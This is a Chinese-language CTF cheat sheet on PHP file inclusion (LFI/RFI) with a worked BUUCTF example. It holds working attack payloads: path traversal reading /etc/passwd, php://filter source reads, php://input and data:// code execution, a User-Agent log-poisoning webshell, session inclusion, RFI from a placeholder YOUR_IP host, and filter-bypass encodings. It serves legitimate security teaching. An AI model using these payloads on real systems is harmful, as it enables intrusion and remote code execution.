# 文件包含 LFI / RFI

关键词：文件包含 LFI RFI php伪协议 php filter php input data 日志包含 session包含 任意文件包含 本地文件包含

## ① 识别指纹

- URL 长这样：`?file=`、`?page=`、`?path=`、`?include=`、`?template=`、`?lang=`、`?view=`、`?module=`
- 页面像是"加载不同模块"：`?page=about`、`?lang=cn`、`?view=home`
- 传一个不存在的值，页面报 `Warning: include(...): failed to open stream`、`include(): Failed opening`、`require_once()`
- 附件源码里能看到 `include($_GET['file'])`、`require`、`include_once`、`$tpl`
- 题干出现 **"文件包含"、"LFI"、"include"、"flag 在 flag.php 里"**
- 题目名带 Include / LFI / FileInclude / 包含
- 上传点和包含点同时存在 → 图片马组合，见 [/web/file-upload](/web/file-upload)
- 页面直接回显文件内容（而不是执行）→ 可能是 `file_get_contents` / `readfile`，转 [/web/path-traversal](/web/path-traversal)

## ② 考什么

- LFI 与 RFI 的判定（`allow_url_include` 是否开启）
- 目录穿越 `../../../../etc/passwd` 与层数计算
- `php://filter` 读源码：`convert.base64-encode`、`read=` 写法
- `php://filter` 的其它过滤器：`convert.iconv`、`zlib.deflate`、`string.rot13`、过滤器链
- `php://input`：POST body 当 PHP 执行（需 `allow_url_include=On`）
- `data://text/plain,<?php ...?>`（同样需要 `allow_url_include=On`）
- `php://filter/convert.base64-encode/resource=` 读任意文件（不依赖 include 执行）
- 日志包含：`/var/log/nginx/access.log`、`/var/log/apache2/access.log`，UA 写马
- Session 包含：`/var/lib/php/sessions/sess_<PHPSESSID>`
- `/proc/self/environ`、`/proc/self/cmdline`、`/proc/self/cwd/`、`/proc/self/fd/N`
- `expect://`（需 expect 扩展）、`phar://`（配合反序列化）
- 过滤绕过：`../` 变形、双重编码、`%00` 截断、后缀补全
- 包含临时文件 / `/tmp` 与条件竞争

## ③ 判断流程

> 先确认"参数真的进了 include"，再决定读文件还是执行代码。两者动作完全不同。

1. **确认包含参数**：`?file=about` 换成 `?file=ctf7xq` → 页面报 include warning 或内容明显变化 → 确认是 include，进 2；页面毫无变化 → 进 6
2. **试路径穿越**：`?file=../../../../etc/passwd` → 回显 `root:x:0:0` → LFI 成立，直接读 `/flag`、`flag.php`，进 12；被拦或回显为空 → 进 3
3. **试 `php://filter`**：`?file=php://filter/convert.base64-encode/resource=index.php` → 返回一长串 Base64 → 解码拿源码，进 4；报 `php://` 被禁 → 进 7
4. **按源码分流**：源码里看三件事——包含路径有没有固定前缀、过滤了哪些字符、`allow_url_include` 是否为 On → 有前缀 → 回 2 用 `../` 或 `php://filter` 绕过；On → 进 5；都没有 → 进 7
5. **走输入流执行**：`?file=php://input` 配合 POST body 写 `<?php system('id');?>`，或 `?file=data://text/plain,<?php ...?>` → 命令执行成功 → 进 12；返回空/报错 → 进 7
6. **兜底 A**：第 1–5 条都不成立 → 回到第 1 条，换参数名（`file` → `page`/`path`/`include`）、换位置（GET → POST → Cookie → header），并确认功能是"包含"还是"读取文件"（后者不回显 PHP 代码，只回显文件内容）
7. **日志包含**：`?file=/var/log/nginx/access.log`（Apache 用 `/var/log/apache2/access.log`）→ 能看到访问日志 → 用 `User-Agent` 写入 `<?php system($_GET[1]);?>`，再包含一次日志 → 执行成功进 12；日志无权限或不存在 → 进 8
8. **Session 包含**：先访问会写 session 的页面（登录、留言），把 payload 存进 session 值，再 `?file=/var/lib/php/sessions/sess_<PHPSESSID>` → 执行成功进 12；路径不对或文件不存在 → 进 9
9. **RFI 判定**：`?file=http://YOUR_IP/shell.txt`，文件内容是 `<?php system('id');?>` → 被执行 → RFI 成立，直接进 12；只把源码当文本回显 → RFI 关闭，进 10
10. **临时文件 + 竞争**：题目同时有上传点 → 上传时文件落在 `/tmp/phpXXXXXX`，在请求结束前包含它；用脚本一边上传一边高频包含 → 抢到一次进 12；无上传点 → 进 11
11. **过滤绕过**：`../` 被删 → `....//`、`..%2f`、`%252e%252e%252f`、`..%c0%af`（老版本）；自动补 `.php` 后缀 → `php://filter/.../resource=flag` 或 `%00` 截断 → 成功后回 2 或 3；全部失败 → 进 13
12. **定位 flag**：读 `/flag`、`flag.php`、`../flag.php`、源码里出现的绝对路径、`/proc/self/cwd/flag` → 读到 flag 结束
13. **兜底 B**：以上都不成立 → 回到第 1 条，先想办法看 `phpinfo()`（很多题直接给），确认 `open_basedir`、`allow_url_include`、`session.save_path`、`disable_functions`，再回第 3 条按真实配置重选

## ④ 工具与命令

```bash
# 1. 基本 LFI：先证明能读系统文件
curl -s "http://t.cn/?file=../../../../etc/passwd"
curl -s "http://t.cn/?file=/etc/passwd"

# 2. 读源码：base64 编码后页面输出的是文本，不会被 PHP 执行
curl -s "http://t.cn/?file=php://filter/convert.base64-encode/resource=index.php" | base64 -d
curl -s "http://t.cn/?file=php://filter/read=convert.base64-encode/resource=config.php" | base64 -d

# 3. php://input（需 allow_url_include=On，PHP 默认 Off）
curl -s "http://t.cn/?file=php://input" --data '<?php system("id");?>'

# 4. data://（同样需要 allow_url_include=On）
curl -s "http://t.cn/?file=data://text/plain,<?php%20system('id');?>"
```

```bash
# 5. 日志包含：先把代码写进日志，再包含日志
curl -s -A '<?php system($_GET[1]);?>' "http://t.cn/"
curl -s "http://t.cn/?file=/var/log/nginx/access.log&1=id"

# 6. 先确认日志与 session 的真实路径（phpinfo 或常见默认值）
ls -l /var/log/nginx/ /var/log/apache2/ 2>/dev/null
ls -l /var/lib/php/sessions/ 2>/dev/null      # Debian 系也可能在 /var/lib/php5/

# 7. 进程与工作目录：定位源码到底在哪
curl -s "http://t.cn/?file=/proc/self/cmdline"
curl -s "http://t.cn/?file=/proc/self/cwd/app.py"
curl -s "http://t.cn/?file=/proc/self/environ"
```

```bash
# 8. 过滤器链 RCE：PHP >= 7，无文件写入时用（php_filter_chain_generator）
python3 php_filter_chain_generator.py --chain '<?php system("id");?>'
# 把输出的整条 php://filter/... 直接塞进 ?file=
```

```text
# 9. 过滤绕过速查（按出现顺序试，成本从低到高）
../../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2f..%2fetc/passwd
%252e%252e%252f%252e%252e%252fetc/passwd
/etc/passwd%00            # 仅 PHP < 5.3.4
php://filter/convert.base64-encode/resource=flag
```

## ⑤ 常见坑

| 现象 | 实际原因 | 正确应对 |
|---|---|---|
| `?file=flag.php` 页面空白 | 文件被 include 执行了，PHP 代码不输出 | 用 `php://filter/convert.base64-encode` 读源码 |
| `php://input` 返回空 | `allow_url_include=Off`（PHP 默认） | 改走 filter 读源码、日志包含或 session 包含 |
| 日志里能看到 payload 但不执行 | 日志把 `<` `>` 转义了，或 UA 没落盘 | 写标准 `<?php ... ?>`，并确认日志原文里有 |
| `/proc/self/environ` 包含失败 | 现代内核/php-fpm 下 environ 不含 UA，或不可读 | 改用日志或 session，别在这条路上耗 |
| session 文件不存在 | `session.save_path` 不是默认值 | 先访问生成 session 的页面，再从 phpinfo 拿真实路径 |
| `../` 被过滤 | 过滤只匹配一次 | `....//`、`..%2f`、双重 URL 编码 |
| 包含成功但页面无输出 | 目标代码不打印内容 | 用 base64 过滤器让文件内容变成页面输出 |
| 相对路径包含不到 | 源码里有固定前缀 `pages/` | 用 `php://filter`，或先算 `../` 的层数 |

## ⑥ 例题

**题目**：`[ACTF2020 新生赛] Include`
**来源**：BUUCTF 复现（原题出自 ACTF 2020 新生赛）
**题干**（大意）：首页只有一个 tips 链接，点进去 URL 变成 `?file=flag.php`，页面回显 "Can you find out the flag?"。

**关键观察**：参数名就叫 `file`，值直接是文件名——典型的 `include($_GET['file'])`。直接请求 `flag.php` 只看到提示语，说明文件确实被包含了、PHP 代码被执行了，源码没有输出。

**走了哪条链**：第 1 条（`?file=` 参数确认包含）→ 第 3 条（`php://filter` 可用，编码读取，省掉第 2 条的穿越）→ 第 4 条（源码只有一行 echo，flag 在注释里）→ 第 12 条（按源码定位 flag）。

**命令与输出**：

```bash
curl -s "http://target/?file=php://filter/convert.base64-encode/resource=flag.php"
```

响应是一长串 Base64，以 `PD9waHA` 开头 —— 这正是 `<?php` 的 Base64 前缀，说明拿到的是源码文本而不是执行结果。

```bash
curl -s "http://target/?file=php://filter/convert.base64-encode/resource=flag.php" | base64 -d
```

解码结果（flag 内容以实例为准）：

```php
<?php
echo "Can you find out the flag?";
//flag{...}
```

**结果**：在 PHP 注释里读到 flag。若首页还给了 `?file=phpinfo.php` 之类入口，顺手确认 `allow_url_include` 与 `open_basedir`，决定要不要走 `php://input` 或日志包含。

::: tip flag 说明
flag 随实例生成，以原题平台为准。这题只有一条链，价值在于把"**直接包含会执行、filter 编码才看得到源码**"变成肌肉记忆；后续遇到带过滤的题，第 11 条（绕过）才是主战场。
:::
